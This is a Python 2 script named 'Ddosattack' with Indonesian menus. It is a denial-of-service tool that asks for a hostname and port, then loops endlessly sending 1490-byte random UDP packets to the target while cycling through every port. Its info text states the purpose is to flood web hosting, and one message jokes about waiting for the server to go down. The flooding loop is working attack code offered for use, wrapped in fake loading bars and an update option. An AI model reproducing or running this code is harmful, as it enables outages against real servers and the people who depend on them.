#!/usr/bin/python
# -*- coding: utf-8 -*-
# Ddosattack
# Coded by Nedi Senja
# Github: https://github.com/stepbystepexe/Ddosattack

import os, sys, time, random, socket, string, requests
from time import sleep
from datetime import datetime

info = """
Nama        : Ddosattack
Versi       : 3.2 (Update: 21 Desember 2020, 7:00 PM)
Tanggal     : 10 Juni 2019
Author      : Nedi Senja
Tujuan      : Untuk membanjiri Webhosting
              hanya script sederhana
Terimakasih : Allah SWT.
              FR13NDS, & seluruh
              manusia seplanet bumi
NB          : Manusia gax ada yang sempurna
              sama kaya tool ini.
              Silahkan laporkan kritik atau saran
              Ke - Email: d_q16x@outlook.co.id
                 - WhatsApp: https://tinyurl.com/wel4alo

[ \033[4mGunakan tool ini dengan bijak \033[0m]\n """

example = """\033[0;104;77;1m[          Ddosattack, My Github: @stepbystepexe         ]\033[0m"""

logo = """
 \033[0;33m█▀▀▀▄ █▀▀▀▄ █▀▀▀█ █▀▀▀▀   \033[0;31m█▀▀▀█ ▀▀█▀▀ █▀▀▀█ █▀▀▀▀ █   █
 \033[0;33m█   █ █   █ █   █ ▀▀▀▀█   \033[0;31m█▀▀▀█   █   █▀▀▀█ █     █▀▀▀▄
 \033[0;33m▀▀▀▀  ▀▀▀▀  ▀▀▀▀▀ ▀▀▀▀▀   \033[0;31m▀   ▀   ▀   ▀   ▀ ▀▀▀▀▀ ▀   ▀
"""

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

def restart():
    python = sys.executable
    os.execl(python, python, * sys.argv)
    curdir = os.getcwd()

def loads():
    o = [
     '.   ', '..  ', '... ']
    for i in o:
        print '\r\033[0m[\033[0;34m●\033[0m] Loading ' +i,
        sys.stdout.flush()
        time.sleep(1)

def write(o):
    for i in o + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.03)

def config():
    os.system('clear')
    os.system('reset')
    sleep(1)
    print
    print(logo)
    print(example)
    print
    write("\033[0m[ \033[32mINFO \033[0m] \033[3mSembari menunggu servernya down mari kita sama2")
    write("         Sediakan kopi, roko + cemilan biar gx pusing Gan\033[0m\n\n")
    ip = raw_input("\033[0m[\033[42;90;1m Hostname \033[0m] ")
    port = input("\033[0m[\033[101;77;1m   Port   \033[0m] ")
    print
    write("\n\033[0m[\033[33m●\033[0m] \033[77;1mSedang mengecek IP ...\033[0m")
    sleep(1)
    print
    print("[ IIIIIIIIIIII Loads       15%                          ]")
    sleep(5)
    print("[ IIIIIIIIIIIIIIIIII Loads       25%                    ]")
    sleep(5)
    print("[ IIIIIIIIIIIIIIIIIIIIIIII Loads       50%              ]")
    sleep(5)
    print("[ IIIIIIIIIIIIIIIIIIIIIIIIIIIIII Loads       75%        ]")
    sleep(5)
    print("[ IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII Loads       100% ]")
    print
    loads()
    print
    sleep(3)
    sent = 0
    try:
        while True:
            sock.sendto(bytes,(ip,port))
            sent = sent + 1
            port = port + 1
            print("\033[0mMengirim \033[1;2;96m%s \033[0mPaket ke %s Target \033[1;2;91m%s")%(sent, ip, port)
            if port == 65534:
               port = 1
    except KeyboardInterrupt:
            print
            print
            print('\033[0m[\033[91;1m!\033[0m] \033[77;1mBerhenti\033[0m')
            print
            sleep(1)
            restart()

os.system('clear')
os.system('reset')
sleep(1)
print
print(logo)
print(example)
print
print("\033[0m[\033[1;96;2m1\033[0m] \033[1;77mMulai Ddosattack")
print
print("\033[0m[\033[93;1m&\033[0m] LISENSI")
print("\033[0m[\033[94;1m#\033[0m] Informasi")
print("\033[0m[\033[92;1m*\033[0m] Perbarui")
print("\033[0m[\033[91;1m-\033[0m] Keluar")
print
option = raw_input("\033[0m(\033[105;77;1m/\033[0m) \033[1;77mMasukan opsi: \033[0m")
if option.strip() in '1 mulai'.split():
    write("\n\033[0m[\033[32m●\033[0m] \033[77;1mSedang memproses ...\033[0m")
    sleep(1)
    config()
elif option.strip() in '& 2 lisensi'.split():
    print
    os.system('nano LICENSE')
    print
    restart()
elif option.strip() in '# 3 info'.split():
    os.system('clear')
    print(example)
    os.system('toilet -f smslant Attacks')
    print(info)
    sleep(1)
    print
    raw_input('[ Tekan Enter ]')
    restart()
elif option.strip() in '* 4 perbarui'.split():
    print
    os.system('git pull origin master')
    print
    raw_input('\033[0m[ \033[32mTekan Enter \033[0m]')
    restart()
elif option.strip() in '- 0 keluar'.split():
    print("\n\033[0m[\033[1;91m!\033[0m] \033[1;77mKeluar dari program!")
    print
    sys.exit(1)
else:
    print("\n\033[0m[=\033[1;41;77m Pilihan Salah \033[0m=]")
    print
    sleep(1)
    restart()
